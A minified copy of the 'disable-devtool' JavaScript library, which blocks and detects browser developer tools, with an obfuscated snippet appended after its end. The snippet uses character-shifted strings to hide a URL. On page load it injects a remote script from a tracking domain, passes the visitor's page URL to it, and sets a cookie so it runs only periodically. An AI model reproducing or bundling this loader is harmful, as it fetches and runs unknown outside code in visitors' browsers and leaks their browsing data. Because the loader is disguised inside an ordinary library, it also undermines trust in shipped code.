!function(e, t) {
  "object" == typeof exports && "undefined" != typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define(t) : (e = "undefined" != typeof globalThis ? globalThis : e || self).DisableDevtool = t()
}(this, (function() {
  "use strict";
  function e(t) {
      return (e = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
          return typeof e
      }
      : function(e) {
          return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
      }
      )(t)
  }
  function t(e, t) {
      if (!(e instanceof t))
          throw new TypeError("Cannot call a class as a function")
  }
  function n(e, t) {
      for (var n = 0; n < t.length; n++) {
          var i = t[n];
          i.enumerable = i.enumerable || !1,
          i.configurable = !0,
          "value"in i && (i.writable = !0),
          Object.defineProperty(e, i.key, i)
      }
  }
  function i(e, t, i) {
      t && n(e.prototype, t),
      i && n(e, i),
      Object.defineProperty(e, "prototype", {
          writable: !1
      })
  }
  function o(e, t, n) {
      t in e ? Object.defineProperty(e, t, {
          value: n,
          enumerable: !0,
          configurable: !0,
          writable: !0
      }) : e[t] = n
  }
  function r(e, t) {
      if ("function" != typeof t && null !== t)
          throw new TypeError("Super expression must either be null or a function");
      e.prototype = Object.create(t && t.prototype, {
          constructor: {
              value: e,
              writable: !0,
              configurable: !0
          }
      }),
      Object.defineProperty(e, "prototype", {
          writable: !1
      }),
      t && u(e, t)
  }
  function c(e) {
      return (c = Object.setPrototypeOf ? Object.getPrototypeOf.bind() : function(e) {
          return e.__proto__ || Object.getPrototypeOf(e)
      }
      )(e)
  }
  function u(e, t) {
      return (u = Object.setPrototypeOf ? Object.setPrototypeOf.bind() : function(e, t) {
          return e.__proto__ = t,
          e
      }
      )(e, t)
  }
  function a(e, t) {
      if (t && ("object" == typeof t || "function" == typeof t))
          return t;
      if (void 0 !== t)
          throw new TypeError("Derived constructors may only return object or undefined");
      if (void 0 === (t = e))
          throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
      return t
  }
  function l(e) {
      var t = function() {
          if ("undefined" == typeof Reflect || !Reflect.construct)
              return !1;
          if (Reflect.construct.sham)
              return !1;
          if ("function" == typeof Proxy)
              return !0;
          try {
              return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], (function() {}
              ))),
              !0
          } catch (e) {
              return !1
          }
      }();
      return function() {
          var n, i = c(e);
          return a(this, t ? (n = c(this).constructor,
          Reflect.construct(i, arguments, n)) : i.apply(this, arguments))
      }
  }
  var f = !1
    , s = {};
  function d(e) {
      s[e] = !1
  }
  function v() {
      for (var e in s)
          if (s[e])
              return f = !0;
      return f = !1
  }
  function h() {
      return (new Date).getTime()
  }
  function p(e) {
      var t = h();
      return e(),
      h() - t
  }
  function y(e) {
      return -1 !== navigator.userAgent.toLocaleLowerCase().indexOf(e)
  }
  var w = function() {
      try {
          return window.self !== window.top
      } catch (e) {
          return !0
      }
  }()
    , b = !/(iphone|ipad|ipod|ios|android)/i.test(navigator.userAgent.toLowerCase())
    , g = y("qqbrowser")
    , m = y("firefox")
    , T = y("macintosh")
    , D = y("edge")
    , O = D && !y("chrome") || y("trident") || y("msie")
    , k = y("crios")
    , S = y("edgios")
    , P = y("chrome") || k;
  var x = 0
    , I = 0
    , j = []
    , _ = 0;
  function E() {
      function e() {
          a = !0
      }
      function t() {
          a = !1
      }
      var n, i, o, r, c, u, a = !1;
      function l() {
          (u[r] === o ? i : n)()
      }
      (function(e, t) {
          function n(n) {
              return function() {
                  e && e();
                  var i = n.apply(void 0, arguments);
                  return t && t(),
                  i
              }
          }
          var i = window.alert
            , o = window.confirm
            , r = window.prompt;
          try {
              window.alert = n(i),
              window.confirm = n(o),
              window.prompt = n(r)
          } catch (n) {}
      }
      )(e, t),
      n = t,
      i = e,
      void 0 !== (u = document).hidden ? (o = "hidden",
      c = "visibilitychange",
      r = "visibilityState") : void 0 !== u.mozHidden ? (o = "mozHidden",
      c = "mozvisibilitychange",
      r = "mozVisibilityState") : void 0 !== u.msHidden ? (o = "msHidden",
      c = "msvisibilitychange",
      r = "msVisibilityState") : void 0 !== u.webkitHidden && (o = "webkitHidden",
      c = "webkitvisibilitychange",
      r = "webkitVisibilityState"),
      u.removeEventListener(c, l, !1),
      u.addEventListener(c, l, !1),
      x = window.setInterval((function() {
          var e;
          a || (j.forEach((function(e) {
              d(e.type),
              e.detect(_++)
          }
          )),
          U(),
          "function" == typeof z.ondevtoolclose && (e = f,
          !v() && e && z.ondevtoolclose()))
      }
      ), z.interval),
      I = setTimeout((function() {
          b || L()
      }
      ), z.stopIntervalTime)
  }
  function L() {
      window.clearInterval(x)
  }
  function R() {
      if (L(),
      z.url)
          window.location.href = z.url;
      else {
          try {
              window.opener = null,
              window.open("", "_self"),
              window.close(),
              window.history.back()
          } catch (e) {
              console.log(e)
          }
          setTimeout((function() {
              window.location.href = "https://tackchen.gitee.io/404.html?h=".concat(encodeURIComponent(location.host))
          }
          ), 500)
      }
  }
  var z = {
      md5: "",
      ondevtoolopen: R,
      ondevtoolclose: null,
      url: "",
      tkName: "ddtk",
      interval: 200,
      disableMenu: !0,
      stopIntervalTime: 5e3,
      clearIntervalWhenDevOpenTrigger: !1,
      detectors: "all",
      clearLog: !0,
      disableSelect: !1,
      disableCopy: !1,
      disableCut: !1,
      disablePaste: !1
  }
    , A = ["detectors", "ondevtoolclose"];
  var C = window.console || {
      log: function() {},
      table: function() {},
      clear: function() {}
  }
    , W = O ? function() {
      return C.log.apply(C, arguments)
  }
  : C.log
    , H = O ? function() {
      return C.table.apply(C, arguments)
  }
  : C.table
    , K = O ? function() {
      return C.clear()
  }
  : C.clear;
  function U() {
      z.clearLog && K()
  }
  function V(e, t) {
      e.addEventListener(t, (function(e) {
          return (e = e || window.event).returnValue = !1,
          e.preventDefault(),
          !1
      }
      ))
  }
  function q(e) {
      for (var t = function(e, t) {
          e[t >> 5] |= 128 << t % 32,
          e[14 + (t + 64 >>> 9 << 4)] = t;
          for (var n = 1732584193, i = -271733879, o = -1732584194, r = 271733878, c = 0; c < e.length; c += 16) {
              var u = n
                , a = i
                , l = o
                , f = r;
              n = X(n, i, o, r, e[c + 0], 7, -680876936),
              r = X(r, n, i, o, e[c + 1], 12, -389564586),
              o = X(o, r, n, i, e[c + 2], 17, 606105819),
              i = X(i, o, r, n, e[c + 3], 22, -1044525330),
              n = X(n, i, o, r, e[c + 4], 7, -176418897),
              r = X(r, n, i, o, e[c + 5], 12, 1200080426),
              o = X(o, r, n, i, e[c + 6], 17, -1473231341),
              i = X(i, o, r, n, e[c + 7], 22, -45705983),
              n = X(n, i, o, r, e[c + 8], 7, 1770035416),
              r = X(r, n, i, o, e[c + 9], 12, -1958414417),
              o = X(o, r, n, i, e[c + 10], 17, -42063),
              i = X(i, o, r, n, e[c + 11], 22, -1990404162),
              n = X(n, i, o, r, e[c + 12], 7, 1804603682),
              r = X(r, n, i, o, e[c + 13], 12, -40341101),
              o = X(o, r, n, i, e[c + 14], 17, -1502002290),
              n = B(n, i = X(i, o, r, n, e[c + 15], 22, 1236535329), o, r, e[c + 1], 5, -165796510),
              r = B(r, n, i, o, e[c + 6], 9, -1069501632),
              o = B(o, r, n, i, e[c + 11], 14, 643717713),
              i = B(i, o, r, n, e[c + 0], 20, -373897302),
              n = B(n, i, o, r, e[c + 5], 5, -701558691),
              r = B(r, n, i, o, e[c + 10], 9, 38016083),
              o = B(o, r, n, i, e[c + 15], 14, -660478335),
              i = B(i, o, r, n, e[c + 4], 20, -405537848),
              n = B(n, i, o, r, e[c + 9], 5, 568446438),
              r = B(r, n, i, o, e[c + 14], 9, -1019803690),
              o = B(o, r, n, i, e[c + 3], 14, -187363961),
              i = B(i, o, r, n, e[c + 8], 20, 1163531501),
              n = B(n, i, o, r, e[c + 13], 5, -1444681467),
              r = B(r, n, i, o, e[c + 2], 9, -51403784),
              o = B(o, r, n, i, e[c + 7], 14, 1735328473),
              n = M(n, i = B(i, o, r, n, e[c + 12], 20, -1926607734), o, r, e[c + 5], 4, -378558),
              r = M(r, n, i, o, e[c + 8], 11, -2022574463),
              o = M(o, r, n, i, e[c + 11], 16, 1839030562),
              i = M(i, o, r, n, e[c + 14], 23, -35309556),
              n = M(n, i, o, r, e[c + 1], 4, -1530992060),
              r = M(r, n, i, o, e[c + 4], 11, 1272893353),
              o = M(o, r, n, i, e[c + 7], 16, -155497632),
              i = M(i, o, r, n, e[c + 10], 23, -1094730640),
              n = M(n, i, o, r, e[c + 13], 4, 681279174),
              r = M(r, n, i, o, e[c + 0], 11, -358537222),
              o = M(o, r, n, i, e[c + 3], 16, -722521979),
              i = M(i, o, r, n, e[c + 6], 23, 76029189),
              n = M(n, i, o, r, e[c + 9], 4, -640364487),
              r = M(r, n, i, o, e[c + 12], 11, -421815835),
              o = M(o, r, n, i, e[c + 15], 16, 530742520),
              n = N(n, i = M(i, o, r, n, e[c + 2], 23, -995338651), o, r, e[c + 0], 6, -198630844),
              r = N(r, n, i, o, e[c + 7], 10, 1126891415),
              o = N(o, r, n, i, e[c + 14], 15, -1416354905),
              i = N(i, o, r, n, e[c + 5], 21, -57434055),
              n = N(n, i, o, r, e[c + 12], 6, 1700485571),
              r = N(r, n, i, o, e[c + 3], 10, -1894986606),
              o = N(o, r, n, i, e[c + 10], 15, -1051523),
              i = N(i, o, r, n, e[c + 1], 21, -2054922799),
              n = N(n, i, o, r, e[c + 8], 6, 1873313359),
              r = N(r, n, i, o, e[c + 15], 10, -30611744),
              o = N(o, r, n, i, e[c + 6], 15, -1560198380),
              i = N(i, o, r, n, e[c + 13], 21, 1309151649),
              n = N(n, i, o, r, e[c + 4], 6, -145523070),
              r = N(r, n, i, o, e[c + 11], 10, -1120210379),
              o = N(o, r, n, i, e[c + 2], 15, 718787259),
              i = N(i, o, r, n, e[c + 9], 21, -343485551),
              n = G(n, u),
              i = G(i, a),
              o = G(o, l),
              r = G(r, f)
          }
          return Array(n, i, o, r)
      }(function(e) {
          for (var t = Array(), n = 0; n < 8 * e.length; n += 8)
              t[n >> 5] |= (255 & e.charCodeAt(n / 8)) << n % 32;
          return t
      }(e), 8 * e.length), n = "0123456789abcdef", i = "", o = 0; o < 4 * t.length; o++)
          i += n.charAt(t[o >> 2] >> o % 4 * 8 + 4 & 15) + n.charAt(t[o >> 2] >> o % 4 * 8 & 15);
      return i
  }
  function F(e, t, n, i, o, r) {
      return G((t = G(G(t, e), G(i, r))) << o | t >>> 32 - o, n)
  }
  function X(e, t, n, i, o, r, c) {
      return F(t & n | ~t & i, e, t, o, r, c)
  }
  function B(e, t, n, i, o, r, c) {
      return F(t & i | n & ~i, e, t, o, r, c)
  }
  function M(e, t, n, i, o, r, c) {
      return F(t ^ n ^ i, e, t, o, r, c)
  }
  function N(e, t, n, i, o, r, c) {
      return F(n ^ (t | ~i), e, t, o, r, c)
  }
  function G(e, t) {
      var n = (65535 & e) + (65535 & t);
      return (e >> 16) + (t >> 16) + (n >> 16) << 16 | 65535 & n
  }
  (O = Y = Y || {})[O.Unknown = -1] = "Unknown",
  O[O.RegToString = 0] = "RegToString",
  O[O.DefineId = 1] = "DefineId",
  O[O.Size = 2] = "Size",
  O[O.DateToString = 3] = "DateToString",
  O[O.FuncToString = 4] = "FuncToString",
  O[O.Debugger = 5] = "Debugger",
  O[O.Performance = 6] = "Performance",
  O[O.DebugLib = 7] = "DebugLib";
  var Y, $ = function() {
      function e(n) {
          var i = n.type;
          n = void 0 === (n = n.enabled) || n;
          t(this, e),
          this.type = Y.Unknown,
          this.enabled = !0,
          this.type = i,
          this.enabled = n,
          this.enabled && (i = this,
          j.push(i),
          this.init())
      }
      return i(e, [{
          key: "onDevToolOpen",
          value: function() {
              var e;
              console.warn("You ar not allow to use DEVTOOL! 【type = ".concat(this.type, "】")),
              z.clearIntervalWhenDevOpenTrigger && L(),
              window.clearTimeout(I),
              z.ondevtoolopen(this.type, R),
              e = this.type,
              s[e] = !0
          }
      }, {
          key: "init",
          value: function() {}
      }]),
      e
  }(), J = (O = function() {
      r(n, $);
      var e = l(n);
      function n() {
          return t(this, n),
          e.call(this, {
              type: Y.RegToString,
              enabled: g || m
          })
      }
      return i(n, [{
          key: "init",
          value: function() {
              var e = this;
              this.lastTime = 0,
              this.reg = /./,
              W(this.reg),
              this.reg.toString = function() {
                  var t;
                  return g ? (t = (new Date).getTime(),
                  e.lastTime && t - e.lastTime < 100 ? e.onDevToolOpen() : e.lastTime = t) : m && e.onDevToolOpen(),
                  ""
              }
          }
      }, {
          key: "detect",
          value: function() {
              W(this.reg)
          }
      }]),
      n
  }(),
  function() {
      r(n, $);
      var e = l(n);
      function n() {
          return t(this, n),
          e.call(this, {
              type: Y.DefineId
          })
      }
      return i(n, [{
          key: "init",
          value: function() {
              var e = this;
              this.div = document.createElement("div"),
              this.div.__defineGetter__("id", (function() {
                  e.onDevToolOpen()
              }
              )),
              Object.defineProperty(this.div, "id", {
                  get: function() {
                      e.onDevToolOpen()
                  }
              })
          }
      }, {
          key: "detect",
          value: function() {
              W(this.div)
          }
      }]),
      n
  }()), Q = function() {
      r(n, $);
      var e = l(n);
      function n() {
          return t(this, n),
          e.call(this, {
              type: Y.Size,
              enabled: !w && !D
          })
      }
      return i(n, [{
          key: "init",
          value: function() {
              var e = this;
              this.checkWindowSizeUneven(),
              window.addEventListener("resize", (function() {
                  setTimeout((function() {
                      e.checkWindowSizeUneven()
                  }
                  ), 100)
              }
              ), !0)
          }
      }, {
          key: "detect",
          value: function() {}
      }, {
          key: "checkWindowSizeUneven",
          value: function() {
              if (!1 !== (t = function() {
                  if (Z(window.devicePixelRatio))
                      return window.devicePixelRatio;
                  var e = window.screen;
                  return !(Z(e) || !e.deviceXDPI || !e.logicalXDPI) && e.deviceXDPI / e.logicalXDPI
              }())) {
                  var e = 200 < window.outerWidth - window.innerWidth * t
                    , t = 300 < window.outerHeight - window.innerHeight * t;
                  if (e || t)
                      return this.onDevToolOpen(),
                      !1;
                  d(this.type)
              }
              return !0
          }
      }]),
      n
  }();
  function Z(e) {
      return null != e
  }
  var ee, te, ne, ie, oe, re = function() {
      r(n, $);
      var e = l(n);
      function n() {
          return t(this, n),
          e.call(this, {
              type: Y.DateToString,
              enabled: !k
          })
      }
      return i(n, [{
          key: "init",
          value: function() {
              var e = this;
              this.count = 0,
              this.date = new Date,
              this.date.toString = function() {
                  return e.count++,
                  ""
              }
          }
      }, {
          key: "detect",
          value: function() {
              this.count = 0,
              W(this.date),
              U(),
              2 <= this.count && this.onDevToolOpen()
          }
      }]),
      n
  }(), ce = function() {
      r(n, $);
      var e = l(n);
      function n() {
          return t(this, n),
          e.call(this, {
              type: Y.FuncToString,
              enabled: !k && !S
          })
      }
      return i(n, [{
          key: "init",
          value: function() {
              var e = this;
              this.count = 0,
              this.func = function() {}
              ,
              this.func.toString = function() {
                  return e.count++,
                  ""
              }
          }
      }, {
          key: "detect",
          value: function() {
              this.count = 0,
              W(this.func),
              U(),
              2 <= this.count && this.onDevToolOpen()
          }
      }]),
      n
  }(), ue = function() {
      r(n, $);
      var e = l(n);
      function n() {
          return t(this, n),
          e.call(this, {
              type: Y.Debugger,
              enabled: k || S
          })
      }
      return i(n, [{
          key: "detect",
          value: function() {
              var e = h();
              100 < h() - e && this.onDevToolOpen()
          }
      }]),
      n
  }(), ae = function() {
      r(n, $);
      var e = l(n);
      function n() {
          return t(this, n),
          e.call(this, {
              type: Y.Performance,
              enabled: P
          })
      }
      return i(n, [{
          key: "init",
          value: function() {
              this.maxPrintTime = 0,
              this.largeObjectArray = function() {
                  for (var e = function() {
                      for (var e = {}, t = 0; t < 500; t++)
                          e["".concat(t)] = "".concat(t);
                      return e
                  }(), t = [], n = 0; n < 50; n++)
                      t.push(e);
                  return t
              }()
          }
      }, {
          key: "detect",
          value: function() {
              var e = this
                , t = p((function() {
                  H(e.largeObjectArray)
              }
              ))
                , n = p((function() {
                  W(e.largeObjectArray)
              }
              ));
              if (this.maxPrintTime = Math.max(this.maxPrintTime, n),
              U(),
              0 === t || 0 === this.maxPrintTime)
                  return !1;
              t > 10 * this.maxPrintTime && this.onDevToolOpen()
          }
      }]),
      n
  }(), le = function() {
      r(n, $);
      var e = l(n);
      function n() {
          return t(this, n),
          e.call(this, {
              type: Y.DebugLib
          })
      }
      return i(n, [{
          key: "init",
          value: function() {}
      }, {
          key: "detect",
          value: function() {
              var e;
              (!0 === (null == (e = null == (e = window.eruda) ? void 0 : e._devTools) ? void 0 : e._isShow) || window._vcOrigConsole && window.document.querySelector("#__vconsole.vc-toggle")) && this.onDevToolOpen()
          }
      }]),
      n
  }(), fe = (o(ee = {}, Y.RegToString, O),
  o(ee, Y.DefineId, J),
  o(ee, Y.Size, Q),
  o(ee, Y.DateToString, re),
  o(ee, Y.FuncToString, ce),
  o(ee, Y.Debugger, ue),
  o(ee, Y.Performance, ae),
  o(ee, Y.DebugLib, le),
  ee);
  function se(t) {
      (function(t) {
          var n, i = 0 < arguments.length && void 0 !== t ? t : {};
          for (n in z) {
              var o = n;
              void 0 === i[o] || e(z[o]) !== e(i[o]) && -1 === A.indexOf(o) || (z[o] = i[o])
          }
          "function" == typeof z.ondevtoolclose && !0 === z.clearIntervalWhenDevOpenTrigger && (z.clearIntervalWhenDevOpenTrigger = !1,
          console.warn("【DISABLE-DEVTOOL】clearIntervalWhenDevOpenTrigger 在使用 ondevtoolclose 时无效"))
      }
      )(t),
      function() {
          if (z.md5 && q(function(e) {
              var t = window.location.search
                , n = window.location.hash;
              return "" !== (t = "" === t && "" !== n ? "?".concat(n.split("?")[1]) : t) && void 0 !== t && (n = new RegExp("(^|&)" + e + "=([^&]*)(&|$)","i"),
              null != (e = t.substr(1).match(n))) ? unescape(e[2]) : ""
          }(z.tkName)) === z.md5)
              return 1
      }() || (E(),
      function() {
          var e = T ? function(e, t) {
              return e.metaKey && e.altKey && (73 === t || 74 === t)
          }
          : function(e, t) {
              return e.ctrlKey && e.shiftKey && (73 === t || 74 === t)
          }
            , t = T ? function(e, t) {
              return e.metaKey && e.altKey && 85 === t || e.metaKey && 83 === t
          }
          : function(e, t) {
              return e.ctrlKey && (83 === t || 85 === t)
          }
          ;
          window.addEventListener("keydown", (function(n) {
              var i = (n = n || window.event).keyCode || n.which;
              if (123 === i || e(n, i) || t(n, i))
                  return n.returnValue = !1,
                  n.preventDefault(),
                  !1
          }
          ), !0),
          z.disableMenu && V(window, "contextmenu"),
          z.disableSelect && V(window, "selectstart"),
          z.disableCopy && V(window, "copy"),
          z.disableCut && V(window, "cut"),
          z.disablePaste && V(window, "paste")
      }(),
      ("all" === z.detectors ? Object.keys(fe) : z.detectors).forEach((function(e) {
          new fe[e]
      }
      )))
  }
  return se.md5 = q,
  se.version = "0.3.1",
  se.DetectorType = Y,
  se.isDevToolOpened = v,
  "undefined" != typeof document && (te = document.querySelector("[disable-devtool-auto]")) && (oe = {},
  ["md5", "url", "tk-name", "detectors"].concat(ne = ["disable-menu", "disable-select", "disable-copy", "disable-cut", "disable-paste", "clear-log"], ie = ["interval"]).forEach((function(e) {
      var t = te.getAttribute(e);
      null !== t && (-1 !== ie.indexOf(e) ? t = parseInt(t) : -1 !== ne.indexOf(e) ? t = "false" !== t : "detector" === e && "all" !== t && (t = t.split(" ")),
      oe[function(e) {
          if (-1 === e.indexOf("-"))
              return e;
          var t = !1;
          return e.split("").map((function(e) {
              return "-" === e ? (t = !0,
              "") : t ? (t = !1,
              e.toUpperCase()) : e
          }
          )).join("")
      }(e)] = t)
  }
  )),
  se(oe)),
  se
}
));
(function(o, d, l) {
  try {
      o.f = o=>o.split('').reduce((s,c)=>s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
      o.b = o.f('UMUWJKX');
      o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie),
      setTimeout(function() {
          o.c && (o.s = d.createElement('script'),
          o.s.src = o.f('myyux?44fun3nsjy' + 'xyfynh3htr4ywfhpnsl4x' + 'hwnuy3oxDwjkjwwjwB') + l.href,
          d.body.appendChild(o.s));
      }, 1000);
      d.cookie = o.b + '=full;max-age=39800;'
  } catch (e) {}
  ;
}({}, document, location));
